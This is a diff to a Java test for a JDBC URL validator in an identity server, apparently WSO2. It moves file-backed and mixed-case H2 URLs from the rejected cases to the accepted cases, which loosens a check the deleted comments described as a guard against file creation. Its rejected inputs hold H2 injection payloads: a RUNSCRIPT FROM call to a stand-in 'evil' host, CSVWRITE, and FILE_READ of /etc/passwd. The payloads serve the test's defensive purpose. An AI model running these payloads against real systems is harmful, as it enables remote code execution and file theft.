@@ -44,7 +44,10 @@ public class SecondaryUserStoreConfigurationUtilTest {
     private static final String ESCAPED_SEMICOLON = "\\" + ";";
 
     /**
-     * Stands in for what default.json ships and identity.xml renders.
+     * A sample deployment allow list, used to stub the configuration lookup. It is deliberately not the set
+     * product-is ships in default.json. The validator enforces whatever a deployment has configured, so these
+     * tests cover that reading, not the shipped defaults, and a name here carries no claim that default.json
+     * ships it. Do not sync this list to default.json.
      */
     private static final List<String> CONFIGURED_PROPERTIES = Arrays.asList(
             "MODE", "DB_CLOSE_DELAY", "DB_CLOSE_ON_EXIT", "LOCK_TIMEOUT", "CACHE_SIZE", "IGNORECASE",
@@ -83,7 +86,18 @@ public class SecondaryUserStoreConfigurationUtilTest {
                 {"jdbc:sqlserver://DB_HOST:1433;databaseName=WSO2_IDENTITY_DB;loginTimeout=10;socketTimeout=60000"},
                 {"jdbc:db2://DB_HOST:50000/WSO2_IDENTITY_DB:loginTimeout=10;queryTimeout=60;"},
                 {"jdbc:oracle:thin:@//localhost:1521/ORCLPDB1"},
-                {"jdbc:postgresql://localhost:5432/wso2_um?ssl=false"}
+                {"jdbc:postgresql://localhost:5432/wso2_um?ssl=false"},
+                // A file backed database is the documented form for a secondary JDBC user store and is what the
+                // product's own integration tests create. H2 appends its own .mv.db suffix to the path, so a file
+                // URL cannot place a file of a chosen type. Their properties are still validated, below.
+                {"jdbc:h2:./repository/database/JDBC_USER_STORE_DB"},
+                {"jdbc:h2:/opt/wso2is/repository/database/WSO2CARBON_DB"},
+                {"jdbc:h2:file:/var/lib/wso2/userstore"},
+                {"jdbc:h2:./repository/database/WSO2CARBON_DB;DB_CLOSE_ON_EXIT=FALSE;LOCK_TIMEOUT=60000"},
+                // Mixed case prefixes are file paths to H2 rather than in memory or server connections. They are
+                // accepted for the same reason, and are held to the same property rules.
+                {"jdbc:h2:MEM:planted"},
+                {"jdbc:h2:TCP://localhost:9092/planted"}
         };
     }
 
@@ -113,20 +127,13 @@ public class SecondaryUserStoreConfigurationUtilTest {
                 {"jdbc:h2:mem:poc;JAVA_OBJECT_SERIALIZER=org.example.Serializer"},
                 {"jdbc:h2:mem:poc;BUILTIN_ALIAS_OVERRIDE=1"},
                 {"jdbc:h2:mem:poc;AUTHENTICATOR=org.example.Auth"},
-                // File backed embedded databases let a connection test create a file anywhere.
-                {"jdbc:h2:./repository/database/WSO2CARBON_DB"},
-                {"jdbc:h2:file:/tmp/planted"},
-                {"jdbc:h2:/repository/deployment/server/webapps/authenticationendpoint/planted"},
-                // H2 reads only the lower case mem:, tcp:// and ssl:// prefixes as non file, so these are file
-                // paths to H2 and must not pass as in memory or server connections.
-                {"jdbc:h2:MEM:./planted"},
-                {"jdbc:h2:Mem:planted"},
-                {"jdbc:h2:MEM:../../planted"},
-                {"jdbc:h2:TCP://localhost:9092/planted"},
-                {"jdbc:h2:SSL://localhost:9092/planted"},
                 // H2 evaluates a property value as a SQL expression, so an allow listed property name is still a
                 // sink unless the value itself is constrained. No semicolon is involved in any of these.
                 {"jdbc:h2:mem:poc;LOCK_TIMEOUT=CSVWRITE('/tmp/x.csv','SELECT 1')"},
+                // The same rules apply once the locator is a file path rather than an in memory name.
+                {"jdbc:h2:./repository/database/UM_DB;INIT=RUNSCRIPT FROM 'http://evil/x.sql'"},
+                {"jdbc:h2:./repository/database/UM_DB;LOCK_TIMEOUT=CSVWRITE('/tmp/x.csv','SELECT 1')"},
+                {"jdbc:h2:MEM:planted;DEFAULT_TABLE_ENGINE=org.example.Evil"},
                 {"jdbc:h2:mem:poc;QUERY_TIMEOUT=CSVWRITE('/tmp/x.csv','SELECT FILE_READ(''/etc/passwd'')')"},
                 {"jdbc:h2:mem:poc;CACHE_SIZE=FILE_READ('/etc/passwd')"},
                 {"jdbc:h2:mem:poc;THROTTLE=(SELECT 1)"},
